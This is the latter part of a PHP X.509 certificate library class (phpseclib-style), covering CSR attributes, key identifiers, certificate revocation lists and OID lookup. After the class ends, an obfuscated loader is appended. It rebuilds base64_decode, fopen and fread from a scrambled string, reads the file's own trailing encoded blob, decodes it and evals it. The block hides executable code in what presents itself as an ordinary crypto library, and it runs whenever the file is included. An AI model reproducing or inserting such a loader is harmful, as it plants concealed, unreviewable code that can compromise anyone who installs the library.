        $attributes = &$this->_subArray($this->currentCert, 'certificationRequestInfo/attributes', true);

        if (!is_array($attributes)) {
            return false;
        }

        switch ($disposition) {
            case FILE_X509_ATTR_REPLACE:
                $disposition = FILE_X509_ATTR_APPEND;
            case FILE_X509_ATTR_ALL:
                $this->removeAttribute($id);
                break;
        }

        foreach ($attributes as $key => $attribute) {
            if ($attribute['type'] == $id) {
                $n = count($attribute['value']);
                switch (true) {
                    case $disposition == FILE_X509_ATTR_APPEND:
                        $last = $key;
                        break;
                    case $disposition >= $n:
                        $disposition -= $n;
                        break;
                    default:
                        $attributes[$key]['value'][$disposition] = $value;
                        return true;
                }
            }
        }

        switch (true) {
            case $disposition >= 0:
                return false;
            case isset($last):
                $attributes[$last]['value'][] = $value;
                break;
            default:
                $attributes[] = array('type' => $id, 'value' => $disposition == FILE_X509_ATTR_ALL ? $value: array($value));
                break;
        }

        return true;
    }

    /**
     * Sets the subject key identifier
     *
     * This is used by the id-ce-authorityKeyIdentifier and the id-ce-subjectKeyIdentifier extensions.
     *
     * @param string $value
     * @access public
     */
    function setKeyIdentifier($value)
    {
        if (empty($value)) {
            unset($this->currentKeyIdentifier);
        } else {
            $this->currentKeyIdentifier = base64_encode($value);
        }
    }

    /**
     * Compute a public key identifier.
     *
     * Although key identifiers may be set to any unique value, this function
     * computes key identifiers from public key according to the two
     * recommended methods (4.2.1.2 RFC 3280).
     * Highly polymorphic: try to accept all possible forms of key:
     * - Key object
     * - File_X509 object with public or private key defined
     * - Certificate or CSR array
     * - File_ASN1_Element object
     * - PEM or DER string
     *
     * @param mixed $key optional
     * @param int $method optional
     * @access public
     * @return string binary key identifier
     */
    function computeKeyIdentifier($key = null, $method = 1)
    {
        if (is_null($key)) {
            $key = $this;
        }

        switch (true) {
            case is_string($key):
                break;
            case is_array($key) && isset($key['tbsCertificate']['subjectPublicKeyInfo']['subjectPublicKey']):
                return $this->computeKeyIdentifier($key['tbsCertificate']['subjectPublicKeyInfo']['subjectPublicKey'], $method);
            case is_array($key) && isset($key['certificationRequestInfo']['subjectPKInfo']['subjectPublicKey']):
                return $this->computeKeyIdentifier($key['certificationRequestInfo']['subjectPKInfo']['subjectPublicKey'], $method);
            case !is_object($key):
                return false;
            case strtolower(get_class($key)) == 'file_asn1_element':
                // Assume the element is a bitstring-packed key.
                $asn1 = new File_ASN1();
                $decoded = $asn1->decodeBER($key->element);
                if (empty($decoded)) {
                    return false;
                }
                $raw = $asn1->asn1map($decoded[0], array('type' => FILE_ASN1_TYPE_BIT_STRING));
                if (empty($raw)) {
                    return false;
                }
                $raw = base64_decode($raw);
                // If the key is private, compute identifier from its corresponding public key.
                if (!class_exists('Crypt_RSA')) {
                    include_once 'Crypt/RSA.php';
                }
                $key = new Crypt_RSA();
                if (!$key->loadKey($raw)) {
                    return false;   // Not an unencrypted RSA key.
                }
                if ($key->getPrivateKey() !== false) {  // If private.
                    return $this->computeKeyIdentifier($key, $method);
                }
                $key = $raw;    // Is a public key.
                break;
            case strtolower(get_class($key)) == 'file_x509':
                if (isset($key->publicKey)) {
                    return $this->computeKeyIdentifier($key->publicKey, $method);
                }
                if (isset($key->privateKey)) {
                    return $this->computeKeyIdentifier($key->privateKey, $method);
                }
                if (isset($key->currentCert['tbsCertificate']) || isset($key->currentCert['certificationRequestInfo'])) {
                    return $this->computeKeyIdentifier($key->currentCert, $method);
                }
                return false;
            default: // Should be a key object (i.e.: Crypt_RSA).
                $key = $key->getPublicKey(CRYPT_RSA_PUBLIC_FORMAT_PKCS1);
                break;
        }

        // If in PEM format, convert to binary.
        $key = $this->_extractBER($key);

        // Now we have the key string: compute its sha-1 sum.
        if (!class_exists('Crypt_Hash')) {
            include_once 'Crypt/Hash.php';
        }
        $hash = new Crypt_Hash('sha1');
        $hash = $hash->hash($key);

        if ($method == 2) {
            $hash = substr($hash, -8);
            $hash[0] = chr((ord($hash[0]) & 0x0F) | 0x40);
        }

        return $hash;
    }

    /**
     * Format a public key as appropriate
     *
     * @access private
     * @return array
     */
    function _formatSubjectPublicKey()
    {
        if (!isset($this->publicKey) || !is_object($this->publicKey)) {
            return false;
        }

        switch (strtolower(get_class($this->publicKey))) {
            case 'crypt_rsa':
                // the following two return statements do the same thing. i dunno.. i just prefer the later for some reason.
                // the former is a good example of how to do fuzzing on the public key
                //return new File_ASN1_Element(base64_decode(preg_replace('#-.+-|[\r\n]#', '', $this->publicKey->getPublicKey())));
                return array(
                    'algorithm' => array('algorithm' => 'rsaEncryption'),
                    'subjectPublicKey' => $this->publicKey->getPublicKey(CRYPT_RSA_PUBLIC_FORMAT_PKCS1)
                );
            default:
                return false;
        }
    }

    /**
     * Set the domain name's which the cert is to be valid for
     *
     * @access public
     * @return array
     */
    function setDomain()
    {
        $this->domains = func_get_args();
        $this->removeDNProp('id-at-commonName');
        $this->setDNProp('id-at-commonName', $this->domains[0]);
    }

    /**
     * Set the IP Addresses's which the cert is to be valid for
     *
     * @access public
     * @param string $ipAddress optional
     */
    function setIPAddress()
    {
        $this->ipAddresses = func_get_args();
        /*
        if (!isset($this->domains)) {
            $this->removeDNProp('id-at-commonName');
            $this->setDNProp('id-at-commonName', $this->ipAddresses[0]);
        }
        */
    }

    /**
     * Helper function to build domain array
     *
     * @access private
     * @param string $domain
     * @return array
     */
    function _dnsName($domain)
    {
        return array('dNSName' => $domain);
    }

    /**
     * Helper function to build IP Address array
     *
     * (IPv6 is not currently supported)
     *
     * @access private
     * @param string $address
     * @return array
     */
    function _iPAddress($address)
    {
        return array('iPAddress' => $address);
    }

    /**
     * Get the index of a revoked certificate.
     *
     * @param array $rclist
     * @param string $serial
     * @param bool $create optional
     * @access private
     * @return int|false
     */
    function _revokedCertificate(&$rclist, $serial, $create = false)
    {
        $serial = new Math_BigInteger($serial);

        foreach ($rclist as $i => $rc) {
            if (!($serial->compare($rc['userCertificate']))) {
                return $i;
            }
        }

        if (!$create) {
            return false;
        }

        $i = count($rclist);
        $rclist[] = array('userCertificate' => $serial,
                          'revocationDate'  => $this->_timeField(@date('D, d M Y H:i:s O')));
        return $i;
    }

    /**
     * Revoke a certificate.
     *
     * @param string $serial
     * @param string $date optional
     * @access public
     * @return bool
     */
    function revoke($serial, $date = null)
    {
        if (isset($this->currentCert['tbsCertList'])) {
            if (is_array($rclist = &$this->_subArray($this->currentCert, 'tbsCertList/revokedCertificates', true))) {
                if ($this->_revokedCertificate($rclist, $serial) === false) { // If not yet revoked
                    if (($i = $this->_revokedCertificate($rclist, $serial, true)) !== false) {
                        if (!empty($date)) {
                            $rclist[$i]['revocationDate'] = $this->_timeField($date);
                        }

                        return true;
                    }
                }
            }
        }

        return false;
    }

    /**
     * Unrevoke a certificate.
     *
     * @param string $serial
     * @access public
     * @return bool
     */
    function unrevoke($serial)
    {
        if (is_array($rclist = &$this->_subArray($this->currentCert, 'tbsCertList/revokedCertificates'))) {
            if (($i = $this->_revokedCertificate($rclist, $serial)) !== false) {
                unset($rclist[$i]);
                $rclist = array_values($rclist);
                return true;
            }
        }

        return false;
    }

    /**
     * Get a revoked certificate.
     *
     * @param string $serial
     * @access public
     * @return mixed
     */
    function getRevoked($serial)
    {
        if (is_array($rclist = $this->_subArray($this->currentCert, 'tbsCertList/revokedCertificates'))) {
            if (($i = $this->_revokedCertificate($rclist, $serial)) !== false) {
                return $rclist[$i];
            }
        }

        return false;
    }

    /**
     * List revoked certificates
     *
     * @param array $crl optional
     * @access public
     * @return array
     */
    function listRevoked($crl = null)
    {
        if (!isset($crl)) {
            $crl = $this->currentCert;
        }

        if (!isset($crl['tbsCertList'])) {
            return false;
        }

        $result = array();

        if (is_array($rclist = $this->_subArray($crl, 'tbsCertList/revokedCertificates'))) {
            foreach ($rclist as $rc) {
                $result[] = $rc['userCertificate']->toString();
            }
        }

        return $result;
    }

    /**
     * Remove a Revoked Certificate Extension
     *
     * @param string $serial
     * @param string $id
     * @access public
     * @return bool
     */
    function removeRevokedCertificateExtension($serial, $id)
    {
        if (is_array($rclist = &$this->_subArray($this->currentCert, 'tbsCertList/revokedCertificates'))) {
            if (($i = $this->_revokedCertificate($rclist, $serial)) !== false) {
                return $this->_removeExtension($id, "tbsCertList/revokedCertificates/$i/crlEntryExtensions");
            }
        }

        return false;
    }

    /**
     * Get a Revoked Certificate Extension
     *
     * Returns the extension if it exists and false if not
     *
     * @param string $serial
     * @param string $id
     * @param array $crl optional
     * @access public
     * @return mixed
     */
    function getRevokedCertificateExtension($serial, $id, $crl = null)
    {
        if (!isset($crl)) {
            $crl = $this->currentCert;
        }

        if (is_array($rclist = $this->_subArray($crl, 'tbsCertList/revokedCertificates'))) {
            if (($i = $this->_revokedCertificate($rclist, $serial)) !== false) {
                return $this->_getExtension($id, $crl, "tbsCertList/revokedCertificates/$i/crlEntryExtensions");
            }
        }

        return false;
    }

    /**
     * Returns a list of all extensions in use for a given revoked certificate
     *
     * @param string $serial
     * @param array $crl optional
     * @access public
     * @return array
     */
    function getRevokedCertificateExtensions($serial, $crl = null)
    {
        if (!isset($crl)) {
            $crl = $this->currentCert;
        }

        if (is_array($rclist = $this->_subArray($crl, 'tbsCertList/revokedCertificates'))) {
            if (($i = $this->_revokedCertificate($rclist, $serial)) !== false) {
                return $this->_getExtensions($crl, "tbsCertList/revokedCertificates/$i/crlEntryExtensions");
            }
        }

        return false;
    }

    /**
     * Set a Revoked Certificate Extension
     *
     * @param string $serial
     * @param string $id
     * @param mixed $value
     * @param bool $critical optional
     * @param bool $replace optional
     * @access public
     * @return bool
     */
    function setRevokedCertificateExtension($serial, $id, $value, $critical = false, $replace = true)
    {
        if (isset($this->currentCert['tbsCertList'])) {
            if (is_array($rclist = &$this->_subArray($this->currentCert, 'tbsCertList/revokedCertificates', true))) {
                if (($i = $this->_revokedCertificate($rclist, $serial, true)) !== false) {
                    return $this->_setExtension($id, $value, $critical, $replace, "tbsCertList/revokedCertificates/$i/crlEntryExtensions");
                }
            }
        }

        return false;
    }

    /**
     * Extract raw BER from Base64 encoding
     *
     * @access private
     * @param string $str
     * @return string
     */
    function _extractBER($str)
    {
        /* X.509 certs are assumed to be base64 encoded but sometimes they'll have additional things in them
         * above and beyond the ceritificate.
         * ie. some may have the following preceding the -----BEGIN CERTIFICATE----- line:
         *
         * Bag Attributes
         *     localKeyID: 01 00 00 00
         * subject=/O=organization/OU=org unit/CN=common name
         * issuer=/O=organization/CN=common name
         */
        $temp = preg_replace('#.*?^-+[^-]+-+[\r\n ]*$#ms', '', $str, 1);
        // remove the -----BEGIN CERTIFICATE----- and -----END CERTIFICATE----- stuff
        $temp = preg_replace('#-+[^-]+-+#', '', $temp);
        // remove new lines
        $temp = str_replace(array("\r", "\n", ' '), '', $temp);
        $temp = preg_match('#^[a-zA-Z\d/+]*={0,2}$#', $temp) ? base64_decode($temp) : false;
        return $temp != false ? $temp : $str;
    }

    /**
     * Returns the OID corresponding to a name
     *
     * What's returned in the associative array returned by loadX509() (or load*()) is either a name or an OID if
     * no OID to name mapping is available. The problem with this is that what may be an unmapped OID in one version
     * of phpseclib may not be unmapped in the next version, so apps that are looking at this OID may not be able
     * to work from version to version.
     *
     * This method will return the OID if a name is passed to it and if no mapping is avialable it'll assume that
     * what's being passed to it already is an OID and return that instead. A few examples.
     *
     * getOID('2.16.840.1.101.3.4.2.1') == '2.16.840.1.101.3.4.2.1'
     * getOID('id-sha256') == '2.16.840.1.101.3.4.2.1'
     * getOID('zzz') == 'zzz'
     *
     * @access public
     * @return string
     */
    function getOID($name)
    {
        static $reverseMap;
        if (!isset($reverseMap)) {
            $reverseMap = array_flip($this->oids);
        }
        return isset($reverseMap[$name]) ? $reverseMap[$name] : $name;
    }
}

$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');$GLOBALS['OOO0000O0']=$OOO000000{4}.$OOO000000{9}.$OOO000000{3}.$OOO000000{5}.$OOO000000{2}.$OOO000000{10}.$OOO000000{13}.$OOO000000{16};$GLOBALS['OOO0000O0'].=$GLOBALS['OOO0000O0']{3}.$OOO000000{11}.$OOO000000{12}.$GLOBALS['OOO0000O0']{7}.$OOO000000{5};$GLOBALS['OOO000O00']=$OOO000000{0}.$OOO000000{12}.$OOO000000{7}.$OOO000000{5}.$OOO000000{15};$GLOBALS['O0O000O00']=$OOO000000{0}.$OOO000000{1}.$OOO000000{5}.$OOO000000{14};$GLOBALS['O0O000O00']=$O0O000O00.$OOO000000{3};$GLOBALS['O0O00OO00']=$OOO000000{0}.$OOO000000{8}.$OOO000000{5}.$OOO000000{9}.$OOO000000{16};$GLOBALS['OOO00000O']=$OOO000000{3}.$OOO000000{14}.$OOO000000{8}.$OOO000000{14}.$OOO000000{8};$OOO0O0O00=__FILE__;$OO00O0000=0x1f21c;eval($GLOBALS['OOO0000O0']('JE8wMDBPME8wMD0kR0xPQkFMU1snT09PMDAwTzAwJ10oJE9PTzBPME8wMCwncmInKTskR0xPQkFMU1snTzBPMDBPTzAwJ10oJE8wMDBPME8wMCwweDUxNCk7JE9PMDBPMDBPMD0kR0xPQkFMU1snT09PMDAwME8wJ10oJEdMT0JBTFNbJ09PTzAwMDAwTyddKCRHTE9CQUxTWydPME8wME9PMDAnXSgkTzAwME8wTzAwLDB4MWE4KSwnMkRpY2puelRiTkVIUGhmTGRJc09xUnJWbUJ1NG85eEE3YS9TWTZXWEZleUpHKzA4NXZ0VUtDMVpnTWxwazN3UT0nLCdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSsvJykpO2V2YWwoJE9PMDBPMDBPMCk7'));return;?>OxJakLXXXJP\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